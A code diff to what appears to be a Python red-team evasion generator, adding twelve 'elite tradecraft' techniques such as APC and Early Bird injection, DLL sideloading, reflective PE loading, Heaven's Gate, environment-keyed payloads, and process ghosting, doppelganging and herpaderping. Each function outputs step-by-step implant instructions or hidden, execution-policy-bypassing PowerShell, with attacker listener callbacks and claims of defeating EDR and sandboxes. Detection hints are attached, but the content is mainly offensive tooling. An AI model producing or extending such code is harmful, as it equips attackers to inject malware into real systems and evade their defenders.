@@ -50,6 +50,19 @@ SUPPORTED_TECHNIQUES = (
     "process_hollowing",
     "module_stomping",
     "thread_hijack",
+    # Elite tradecraft (v4.3)
+    "rop_sleep",
+    "set_windows_hook_loader",
+    "com_rot_injection",
+    "environment_keying",
+    "in_memory_pe_loader",
+    "dll_sideload",
+    "apc_injection",
+    "early_bird_apc",
+    "heaven_gate",
+    "process_ghosting",
+    "process_doppelganging",
+    "process_herpaderping",
 )
 
 
@@ -1215,6 +1228,524 @@ def _lolbas_pubprn(payload: str, obfuscate: bool, lhost: str, lport: int) -> Eva
     )
 
 
+# ── Elite tradecraft (v4.3) ───────────────────────────────────────────────────
+
+def _rop_sleep(payload: str, obfuscate: bool) -> EvasionResult:
+    src = (
+        "// ROP-chain sleep mask. Defeats memory scanners that snapshot beacons\n"
+        "// during sleep intervals AND callstack-based detections (Ekko's WaitFor\n"
+        "// is itself a tell). Builds a chain that calls VirtualProtect → SystemFunction032\n"
+        "// (RC4) → WaitForSingleObject → SystemFunction032 (decrypt) → VirtualProtect → NtContinue.\n"
+        "// The thread context is preserved across the sleep — no callstack artifact.\n"
+        "//\n"
+        "// References: https://github.com/Cracked5pider/Ekko (Ekko)\n"
+        "//             https://github.com/SaadAhla/RtlpSleepWithROP (RtlpSleepWithROP)\n"
+        "//\n"
+        "// Operator embeds in beacon. Pseudo-code C:\n"
+        "//   CONTEXT ctx; GetThreadContext(self, &ctx);\n"
+        "//   build_rop_chain(&ctx, sleep_ms);\n"
+        "//   NtContinue(&ctx, FALSE);    // returns to the chain start with new RIP/RSP\n"
+        "// The chain executes the encrypt → wait → decrypt cycle then NtContinue's\n"
+        "// back into the beacon proper.\n"
+    )
+    return EvasionResult(
+        command=src,
+        technique="rop_sleep",
+        notes=(
+            "ROP-chain sleep mask. Stronger than Ekko because the callstack during "
+            "sleep contains only legitimate ntdll/kernel32 frames. Embeds in the "
+            "implant — operator builds with the rest of the beacon."
+        ),
+        techniques=["T1027", "T1620"],
+        risk="CRITICAL",
+        detections=[
+            "Kernel ETW Threat-Intel events: NtContinue from non-image return address",
+            "Stack pivot detection (RSP suddenly outside thread stack range)",
+            "VirtualProtect on image region followed by RC4-pattern memory writes",
+        ],
+    )
+
+
+def _set_windows_hook_loader(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
+    src = (
+        "// SetWindowsHookEx DLL injection. Loads a payload DLL into every GUI thread\n"
+        "// of a specified process by registering a global hook. Powerful, quiet, and\n"
+        "// available since Windows 3.0 — many EDRs still trip over it.\n"
+        "//\n"
+        "// 1. Compile a DLL with DllMain that fires the implant on DLL_PROCESS_ATTACH.\n"
+        "// 2. Drop the DLL to disk (or stage in memory via ManualMap).\n"
+        "// 3. Call LoadLibrary on the local process to obtain the proc address.\n"
+        "// 4. SetWindowsHookEx(WH_GETMESSAGE, hookProc, hMod, threadId)\n"
+        "//    - threadId=0 hooks every GUI thread in every process.\n"
+        "//    - threadId=<remote> targets one process via its main thread ID.\n"
+        "// 5. Generate any window message in the target process (e.g. PostThreadMessage)\n"
+        "//    to force OS to map the DLL.\n"
+        "//\n"
+        "// Pair with shellcode/DLL built from /generate?language=csharp.\n"
+        f"// Listener: {lhost}:{lport}\n"
+        "//\n"
+        "// detections:\n"
+        "//   - Sysmon Event 7 — DLL loaded into a process with no other connection\n"
+        "//   - SetWindowsHookEx with WH_GETMESSAGE from non-msrpc process\n"
+        "//   - DLL loaded from non-system path into svchost.exe / explorer.exe\n"
+    )
+    return EvasionResult(
+        command=src,
+        technique="set_windows_hook_loader",
+        notes=(
+            f"SetWindowsHookEx-based DLL injection. Stealthy because the DLL load "
+            f"happens via the standard message dispatch path — no CreateRemoteThread "
+            f"or QueueUserAPC artifact. Listener: {lhost}:{lport}."
+        ),
+        techniques=["T1055.001"],
+        risk="HIGH",
+        detections=[
+            "DLL load from non-system path into GUI process (Sysmon Event 7)",
+            "SetWindowsHookEx call followed by PostThreadMessage to target TID",
+            "Defender ASR 'Block executable files from running unless they meet a prevalence' on loaded DLL",
+        ],
+    )
+
+
+def _com_rot_injection(payload: str, obfuscate: bool) -> EvasionResult:
+    code = (
+        "# COM Running Object Table abuse — registers a malicious COM object that\n"
+        "# legitimate apps will instantiate on next call. Subtle persistence + lateral\n"
+        "# code-execution in one move.\n"
+        "Add-Type -TypeDefinition @'\n"
+        "using System;\n"
+        "using System.Runtime.InteropServices;\n"
+        "public static class RotInject {\n"
+        "    [DllImport(\"ole32\")] public static extern int GetRunningObjectTable(int reserved, out IntPtr prot);\n"
+        "    [DllImport(\"ole32\")] public static extern int CreateItemMoniker(string lpszDelim, string lpszItem, out IntPtr ppmk);\n"
+        "    [DllImport(\"ole32\")] public static extern int CoInitialize(IntPtr p);\n"
+        "    // ROT entry registers a name → IUnknown* mapping.\n"
+        "    // Legit apps (Office automation, AutoCAD) call GetObject(\"namedItem\") and\n"
+        "    // receive our IUnknown — our COM server's QueryInterface runs first.\n"
+        "}\n"
+        "'@;\n"
+        "Write-Output 'COM ROT injection: operator implements IClassFactory and registers entry'"
+    )
+    if obfuscate:
+        code = ps_tick_marks(code)
+    return EvasionResult(
+        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
+        technique="com_rot_injection",
+        notes=(
+            "COM Running Object Table injection. Used by legitimate apps for IPC; "
+            "operator registers a moniker name commonly checked by automation "
+            "consumers (Outlook, Word, Excel). Defeats EDRs that don't audit ROT "
+            "registrations. Requires per-user COM init."
+        ),
+        techniques=["T1559.001", "T1546"],
+        risk="HIGH",
+        detections=[
+            "ole32!RegisterActiveObject from non-Office user-mode process",
+            "Sysmon Event 7: ole32.dll loaded in PowerShell with no Office context",
+            "ETW: COM activation events with unusual CLSID",
+        ],
+    )
+
+
+def _environment_keying(payload: str, obfuscate: bool) -> EvasionResult:
+    code = (
+        "Add-Type -TypeDefinition @'\n"
+        "using System;\n"
+        "using System.Management;\n"
+        "using System.Security.Cryptography;\n"
+        "using System.Text;\n"
+        "public static class EnvKey {\n"
+        "    // Derive a 32-byte key from machine-bound facts. Sample at engagement\n"
+        "    // start, hash, and embed in the payload. The payload only decrypts when\n"
+        "    // re-derivation on the target matches.\n"
+        "    public static byte[] Derive() {\n"
+        "        var sb = new StringBuilder();\n"
+        "        foreach (ManagementObject m in new ManagementObjectSearcher(\"SELECT * FROM Win32_BIOS\").Get())\n"
+        "            sb.Append(m[\"SerialNumber\"]?.ToString() ?? \"\");\n"
+        "        foreach (ManagementObject m in new ManagementObjectSearcher(\"SELECT * FROM Win32_ComputerSystem\").Get())\n"
+        "            sb.Append(m[\"Manufacturer\"]?.ToString() ?? \"\").Append(m[\"Model\"]?.ToString() ?? \"\");\n"
+        "        sb.Append(Environment.UserDomainName);\n"
+        "        using (var sha = SHA256.Create()) {\n"
+        "            return sha.ComputeHash(Encoding.UTF8.GetBytes(sb.ToString()));\n"
+        "        }\n"
+        "    }\n"
+        "}\n"
+        "'@;\n"
+        "$k = [EnvKey]::Derive();\n"
+        "$hex = [BitConverter]::ToString($k).Replace('-', '').ToLower();\n"
+        "Write-Output \"derived key (sample at engagement start): $hex\"\n"
+        "# Operator: at engagement start, run once and copy $hex into the payload.\n"
+        "# At runtime, payload re-derives and uses as AES key to decrypt the\n"
+        "# embedded shellcode. Wrong host = wrong key = decrypt produces garbage."
+    )
+    if obfuscate:
+        code = ps_tick_marks(code)
+    return EvasionResult(
+        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
+        technique="environment_keying",
+        notes=(
+            "Environment-keyed payload. Decryption key is derived from machine-bound "
+            "facts (BIOS serial + manufacturer/model + user domain). Sandboxes get a "
+            "different key → ciphertext decrypts to garbage → analysis tools see only "
+            "noise. Defeats automated sandbox detonation."
+        ),
+        techniques=["T1027.013", "T1480.001"],
+        risk="CRITICAL",
+        detections=[
+            "Win32_BIOS + Win32_ComputerSystem WMI queries followed by SHA-256 + AES",
+            "Process probing BIOS serial on first execution",
+            "Embedded AES-encrypted blob that fails to decrypt outside target",
+        ],
+    )
+
+
+def _in_memory_pe_loader(payload: str, obfuscate: bool) -> EvasionResult:
+    src = (
+        "// Reflective in-memory PE loader stub — C#. Operator embeds a base64'd\n"
+        "// .NET assembly or native PE in the loader source; the loader maps it\n"
+        "// into memory and invokes its entry point — no disk artifact, no\n"
+        "// LoadLibrary fingerprint.\n"
+        "//\n"
+        "// .NET path (easy): Assembly.Load(byte[]) → invoke EntryPoint.\n"
+        "//   var asm = Assembly.Load(Convert.FromBase64String(B64));\n"
+        "//   asm.EntryPoint.Invoke(null, new object[] { new string[]{} });\n"
+        "//\n"
+        "// Native path (harder, stealthier):\n"
+        "//   1. VirtualAlloc(NULL, sizeOfImage, MEM_COMMIT, PAGE_READWRITE)\n"
+        "//   2. Memcpy headers; for each section memcpy into image.\n"
+        "//   3. Walk relocation table; apply deltas.\n"
+        "//   4. Walk import table; LoadLibrary + GetProcAddress; patch IAT.\n"
+        "//   5. VirtualProtect per-section based on Characteristics.\n"
+        "//   6. Call entrypoint at base + AddressOfEntryPoint.\n"
+        "//\n"
+        "// References: stephenfewer/ReflectiveDLLInjection (canonical),\n"
+        "//             monoxgas/sRDI (single-file).\n"
+        "//\n"
+        "// detections:\n"
+        "//   - Assembly.Load(byte[]) — Microsoft-Windows-DotNETRuntime / AMSI 2nd-stage\n"
+        "//   - Manual mapping: image-region in memory with no corresponding LdrData entry\n"
+        "//   - VirtualProtect flip from RW to RX without prior VirtualAlloc EXEC\n"
+    )
+    return EvasionResult(
+        command=src,
+        technique="in_memory_pe_loader",
+        notes=(
+            "Reflective PE loader. .NET path is the one-liner; native path is "
+            "stealthier but verbose. Operator embeds Assembly.Load(b64) inside any "
+            "evasion chain. For native PEs use stephenfewer/ReflectiveDLLInjection."
+        ),
+        techniques=["T1620"],
+        risk="CRITICAL",
+        detections=[
+            "Assembly.Load(byte[]) call from non-Microsoft assembly",
+            "Manual map detection — image region without LdrData entry",
+            "AMSI 2nd-stage scan of decoded .NET assembly bytes",
+        ],
+    )
+
+
+def _dll_sideload(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
+    src = (
+        "// DLL sideloading — abuse a legitimate signed executable that loads a\n"
+        "// satellite DLL by relative path. Drop your malicious DLL beside it. The\n"
+        "// EXE's signed image hash is unchanged, but YOUR DLL runs in its context.\n"
+        "//\n"
+        "// Operator's flow:\n"
+        "// 1. Pick a target binary. Common ones with known sideload vectors:\n"
+        "//    - OneDrive.exe → loads version.dll relative\n"
+        "//    - dbghelp.exe → loads dbgcore.dll relative\n"
+        "//    - python.exe → loads python3.dll relative\n"
+        "//    - signed AV/EDR uninstallers — sometimes load mscoree.dll relative\n"
+        "//    Full list: hijacklibs.net\n"
+        "// 2. Build a proxy DLL with the same export table as the real version.dll.\n"
+        "//    Every exported function calls through to the real DLL EXCEPT one of\n"
+        "//    them which runs your payload first.\n"
+        "// 3. Drop both your proxy DLL and the signed EXE into %APPDATA%\\<vendor>\\.\n"
+        "//    Execute the EXE.\n"
+        "//\n"
+        "// Proxy DLL skeleton (compile with /export forwarding for the boring ones):\n"
+        "//   #pragma comment(linker, \"/export:GetFileVersionInfoA=C:\\\\Windows\\\\System32\\\\version.GetFileVersionInfoA,@1\")\n"
+        "//   #pragma comment(linker, \"/export:GetFileVersionInfoSizeA=C:\\\\Windows\\\\System32\\\\version.GetFileVersionInfoSizeA,@2\")\n"
+        "//   // ... rest of exports ...\n"
+        "//   BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID l) {\n"
+        "//       if (r == DLL_PROCESS_ATTACH) {\n"
+        "//           // Connect back to attacker:\n"
+        f"//           //   {lhost}:{lport}\n"
+        "//           CreateThread(NULL, 0, RunBeacon, NULL, 0, NULL);\n"
+        "//       }\n"
+        "//       return TRUE;\n"
+        "//   }\n"
+        "//\n"
+        "// detections:\n"
+        "//   - Signed binary loading DLL from %APPDATA% (Sysmon Event 7)\n"
+        "//   - DLL with manifest mismatch vs catalog-signed copy\n"
+        "//   - hijacklibs.net intel feeds in modern EDRs\n"
+    )
+    return EvasionResult(
+        command=src,
+        technique="dll_sideload",
+        notes=(
+            f"DLL sideloading template. Pair a signed legitimate EXE with your "
+            f"proxy DLL. Listener: {lhost}:{lport}. Most operators target Citrix, "
+            "Adobe, or vendor agents — hijacklibs.net has the full catalog."
+        ),
+        techniques=["T1574.002"],
+        risk="HIGH",
+        detections=[
+            "Signed binary loading DLL from %APPDATA% or %TEMP% (Sysmon Event 7)",
+            "Image-load anomaly: DLL filename matches system DLL but loaded from non-system path",
+            "Defender ASR 'Block credential stealing from the Windows local security authority subsystem' (LSASS-adjacent)",
+        ],
+    )
+
+
+def _apc_injection(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
+    src = (
+        "// Classic APC injection via NtQueueApcThread. Operator embeds in implant.\n"
+        "//\n"
+        "// 1. OpenProcess(target_pid, PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION)\n"
+        "// 2. VirtualAllocEx, WriteProcessMemory for shellcode.\n"
+        "// 3. Iterate threads in target, OpenThread(THREAD_SET_CONTEXT|THREAD_GET_CONTEXT|THREAD_SUSPEND_RESUME)\n"
+        "// 4. NtQueueApcThread(hThread, &shellcode, NULL, NULL, NULL)\n"
+        "// 5. For non-alertable threads: NtAlertResumeThread to coerce into alertable state.\n"
+        "//\n"
+        "// Listener: " + f"{lhost}:{lport}\n"
+        "//\n"
+        "// detections:\n"
+        "//   - Sysmon Event 8 — APC queue to remote thread\n"
+        "//   - WriteProcessMemory followed by NtQueueApcThread (classic pair)\n"
+        "//   - EDR userland hook on NtQueueApcThread\n"
+    )
+    return EvasionResult(
+        command=src,
+        technique="apc_injection",
+        notes=(
+            f"APC injection template. Cross-process code execution that doesn't "
+            f"create a new thread (uses existing target thread). Listener: "
+            f"{lhost}:{lport}. EDRs hook NtQueueApcThread — chain with direct_syscalls."
+        ),
+        techniques=["T1055.004"],
+        risk="HIGH",
+        detections=[
+            "Sysmon Event 8 (CreateRemoteThread / RemoteAPC)",
+            "NtQueueApcThread from non-debugger context",
+            "EDR rule on WriteProcessMemory + NtQueueApcThread sequence",
+        ],
+    )
+
+
+def _early_bird_apc(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
+    src = (
+        "// Early Bird APC injection — queue the APC BEFORE the target's main thread\n"
+        "// runs. Shellcode executes during ntdll initialization, before any user-mode\n"
+        "// EDR hook is in place.\n"
+        "//\n"
+        "// 1. CreateProcess(target.exe, CREATE_SUSPENDED) — fresh process, no threads alive yet.\n"
+        "// 2. VirtualAllocEx + WriteProcessMemory in the suspended process.\n"
+        "// 3. NtQueueApcThread on the suspended main thread.\n"
+        "// 4. ResumeThread — main thread wakes up, ntdll initializes,\n"
+        "//    APC fires before any user-mode code runs.\n"
+        "//\n"
+        "// Pair with shellcode from /generate?language=csharp&lhost=" + lhost + f"&lport={lport}\n"
+        "//\n"
+        "// detections:\n"
+        "//   - CreateProcess(SUSPENDED) followed by VirtualAllocEx (Sysmon)\n"
+        "//   - APC queued to thread before it has run\n"
+        "//   - Thread start address inside non-image RX region\n"
+    )
+    return EvasionResult(
+        command=src,
+        technique="early_bird_apc",
+        notes=(
+            f"Early Bird APC. Bypasses userland EDR hooks because the APC executes "
+            f"during ntdll initialization — before the hook DLL is loaded. Listener: "
+            f"{lhost}:{lport}. One of the most effective injection patterns of 2024-25."
+        ),
+        techniques=["T1055.004"],
+        risk="CRITICAL",
+        detections=[
+            "Suspicious CreateProcess(SUSPENDED) followed by WriteProcessMemory",
+            "Kernel ETW Threat-Intel: APC queued to suspended thread",
+            "EDR rule 'NtQueueApcThread to thread that has never run'",
+        ],
+    )
+
+
+def _heaven_gate(payload: str, obfuscate: bool) -> EvasionResult:
+    src = (
+        "// Heaven's Gate — pivot from a 32-bit (WoW64) process to 64-bit native\n"
+        "// execution. Some EDRs only hook the 64-bit NTDLL; 32-bit processes that\n"
+        "// reach their 64-bit twin bypass user-mode telemetry entirely.\n"
+        "//\n"
+        "// Mechanism: WoW64 processes have BOTH ntdll.dll (64-bit) and wow64.dll\n"
+        "// loaded. The 64-bit ntdll is reachable via segment-selector 0x33 (long mode)\n"
+        "// while the 32-bit binary normally runs in 0x23 (compat mode).\n"
+        "//\n"
+        "// FAR JMP 0x33:offset transitions to 64-bit. Issue the syscall there with\n"
+        "// the proper x64 register convention. Return via FAR JMP 0x23:offset.\n"
+        "//\n"
+        "// Skeleton (inline assembly required — operator writes in Nim or MASM):\n"
+        "//\n"
+        "//   ; 32-bit code\n"
+        "//   push 0x33                  ; long mode selector\n"
+        "//   call $+5\n"
+        "//   add dword [esp], 5         ; return address into 64-bit code\n"
+        "//   retf                       ; far return → 64-bit execution\n"
+        "//   ; 64-bit code follows; issue x64 NTAPI directly here\n"
+        "//\n"
+        "// References: blog.rewolf.pl, github.com/khoaSec/heavens-gate-pls.\n"
+        "//\n"
+        "// detections:\n"
+        "//   - WoW64 process issuing x64 syscalls (rare; Threat-Intel ETW)\n"
+        "//   - FAR JMP with selector 0x33 in a 32-bit binary (memory-scanner signature)\n"
+        "//   - Mismatch between 32-bit hook installation and 64-bit observed calls\n"
+    )
+    return EvasionResult(
+        command=src,
+        technique="heaven_gate",
+        notes=(
+            "Heaven's Gate — 32-bit-to-64-bit syscall pivot. Bypasses EDRs that only "
+            "hook 64-bit NTDLL and assume WoW64 processes can't reach native syscalls. "
+            "Requires inline asm — operator writes in Nim/MASM, not Python."
+        ),
+        techniques=["T1106"],
+        risk="CRITICAL",
+        detections=[
+            "WoW64 process performing 64-bit syscalls (Threat-Intel ETW)",
+            "Segment-selector 0x33 in 32-bit binary (memory pattern scan)",
+            "EDR sensor mismatch — 32-bit hooks see no calls, 64-bit kernel telemetry sees activity",
+        ],
+    )
+
+
+def _process_ghosting(payload: str, obfuscate: bool) -> EvasionResult:
+    src = (
+        "// Process Ghosting — file is deleted BEFORE the section is mapped, so the\n"
+        "// resulting process has no on-disk backing image. Defender's image-integrity\n"
+        "// scan can't fetch the bytes to compare. Disclosed by Elastic in 2021;\n"
+        "// still effective against many vendors as of 2025.\n"
+        "//\n"
+        "// 1. NtCreateFile with FILE_DISPOSITION_DELETE — opens a file already marked for delete.\n"
+        "// 2. NtWriteFile shellcode.\n"
+        "// 3. NtCreateSection(SEC_IMAGE) on the deletion-pending file.\n"
+        "// 4. Close the file handle — file is gone, but the section persists.\n"
+        "// 5. NtCreateProcessEx using the section.\n"
+        "// 6. NtCreateThreadEx in the new process.\n"
+        "//\n"
+        "// References: https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack\n"
+        "//\n"
+        "// detections:\n"
+        "//   - Process with no FileName / Image path (anomalous)\n"
+        "//   - NtCreateProcessEx from a section whose backing file is deleted\n"
+        "//   - PsSetCreateProcessNotifyRoutineEx kernel callback sees no image path\n"
+    )
+    return EvasionResult(
+        command=src,
+        technique="process_ghosting",
+        notes=(
+            "Process Ghosting. Spawns a process whose backing file no longer exists. "
+            "Defender's pre-execution image-hash check can't run. Modern Defender "
+            "for Endpoint flags processes with NULL image paths — chain with PPID "
+            "spoof to misattribute the parent."
+        ),
+        techniques=["T1055.012", "T1070.004"],
+        risk="CRITICAL",
+        detections=[
+            "Sysmon Event 1 with empty/anomalous Image path",
+            "Kernel callback PsSetCreateProcessNotifyRoutineEx with no image data",
+            "EDR rule 'process created from deletion-pending file'",
+        ],
+    )
+
+
+def _process_doppelganging(payload: str, obfuscate: bool) -> EvasionResult:
+    src = (
+        "// Process Doppelganging — uses NTFS Transactional API (TxF). Create a\n"
+        "// transaction, write the malicious payload to a legitimate filename WITHIN\n"
+        "// the transaction, map it as a section, then ROLL BACK the transaction.\n"
+        "// On-disk the file is unchanged; the section retains the rolled-back bytes.\n"
+        "// Process created from that section runs the malicious code while the\n"
+        "// on-disk file still looks clean.\n"
+        "//\n"
+        "// 1. CreateTransaction\n"
+        "// 2. CreateFileTransacted(legit.exe, GENERIC_WRITE, ...)\n"
+        "// 3. WriteFile(shellcode_pe_bytes)\n"
+        "// 4. NtCreateSection(SEC_IMAGE) on the transacted file\n"
+        "// 5. RollbackTransaction — on-disk file is reverted\n"
+        "// 6. NtCreateProcessEx using the section\n"
+        "// 7. NtCreateThreadEx\n"
+        "//\n"
+        "// Disclosed by enSilo at Black Hat EU 2017. TxF is deprecated but still\n"
+        "// works on Win10/11 for backward compatibility. PsSetCreateProcessNotify\n"
+        "// callbacks see the new process pointing at the original (clean) filename.\n"
+        "//\n"
+        "// detections:\n"
+        "//   - Transactions enumerated by EDR (rare in legitimate workloads)\n"
+        "//   - File memory section that doesn't match on-disk hash\n"
+        "//   - EDR memory integrity scan of process .text vs file\n"
+    )
+    return EvasionResult(
+        command=src,
+        technique="process_doppelganging",
+        notes=(
+            "Process Doppelganging — TxF-based hollowing. On-disk file looks clean "
+            "to AV scanners; in-memory image is the payload. TxF is deprecated by "
+            "Microsoft but still functions on current Windows. Pair with PPID spoof."
+        ),
+        techniques=["T1055.013"],
+        risk="CRITICAL",
+        detections=[
+            "Transactional NTFS operations from non-system process",
+            "NtCreateSection on a transacted file followed by RollbackTransaction",
+            "EDR memory-integrity scan: image .text content drift from disk hash",
+        ],
+    )
+
+
+def _process_herpaderping(payload: str, obfuscate: bool) -> EvasionResult:
+    src = (
+        "// Process Herpaderping — write malicious PE → map it → MODIFY the file →\n"
+        "// CreateProcess. Many AV scan the file at NtCreateSection time; by the time\n"
+        "// the kernel reads the file for the PsSet callback, the bytes are different.\n"
+        "// Result: callback fires with the post-modification bytes (looks clean),\n"
+        "// while the section retains the pre-modification (malicious) bytes.\n"
+        "//\n"
+        "// 1. CreateFile(legit_name.exe, GENERIC_WRITE|GENERIC_READ).\n"
+        "// 2. WriteFile(malicious_pe).\n"
+        "// 3. NtCreateSection(SEC_IMAGE) — section now contains malicious bytes.\n"
+        "// 4. SetFilePointer + WriteFile(legit_pe) — overwrite on-disk with clean PE.\n"
+        "// 5. NtCreateProcessEx using the section.\n"
+        "// 6. NtCreateThreadEx.\n"
+        "// 7. (Optionally) delete or restore the file.\n"
+        "//\n"
+        "// Disclosed by jxy-s on GitHub (2020). Microsoft initially marked WONTFIX,\n"
+        "// then quietly patched the EDR side in WDAC + DefenderXDR. Still works\n"
+        "// against signature-based AV.\n"
+        "//\n"
+        "// detections:\n"
+        "//   - Image memory section content drift from on-disk hash\n"
+        "//   - Memory-integrity scan during pre-thread phase\n"
+        "//   - EDR rule on NtCreateSection followed by WriteFile to same handle\n"
+    )
+    return EvasionResult(
+        command=src,
+        technique="process_herpaderping",
+        notes=(
+            "Process Herpaderping. Section captures malicious bytes; on-disk file "
+            "is overwritten with a benign PE before process callbacks fire. Defeats "
+            "signature-based AV. Modern XDR (DefenderXDR + CrowdStrike) memory "
+            "integrity scans flag the drift."
+        ),
+        techniques=["T1055.012", "T1027"],
+        risk="CRITICAL",
+        detections=[
+            "EDR memory-integrity: image .text drift from on-disk hash at thread start",
+            "Sysmon Event 11 (FileCreate) overlapping with Event 1 (process create)",
+            "WriteFile to a handle just after NtCreateSection on it",
+        ],
+    )
+
+
 # ── Public API ─────────────────────────────────────────────────────────────────
 
 # Techniques that take (payload, obfuscate, lhost, lport).
@@ -1223,6 +1754,7 @@ _NETWORK_TECHNIQUES = {
     "lolbas_cmstp", "lolbas_msxsl", "lolbas_wmic_xsl", "lolbas_syncappv",
     "lolbas_pubprn", "direct_syscalls", "indirect_syscalls",
     "process_hollowing", "module_stomping", "thread_hijack",
+    "set_windows_hook_loader", "dll_sideload", "apc_injection", "early_bird_apc",
 }
 
 _DISPATCH = {
@@ -1267,6 +1799,19 @@ _DISPATCH = {
     "process_hollowing": _process_hollowing,
     "module_stomping": _module_stomping,
     "thread_hijack": _thread_hijack,
+    # Elite (v4.3)
+    "rop_sleep": _rop_sleep,
+    "set_windows_hook_loader": _set_windows_hook_loader,
+    "com_rot_injection": _com_rot_injection,
+    "environment_keying": _environment_keying,
+    "in_memory_pe_loader": _in_memory_pe_loader,
+    "dll_sideload": _dll_sideload,
+    "apc_injection": _apc_injection,
+    "early_bird_apc": _early_bird_apc,
+    "heaven_gate": _heaven_gate,
+    "process_ghosting": _process_ghosting,
+    "process_doppelganging": _process_doppelganging,
+    "process_herpaderping": _process_herpaderping,
 }
 
 
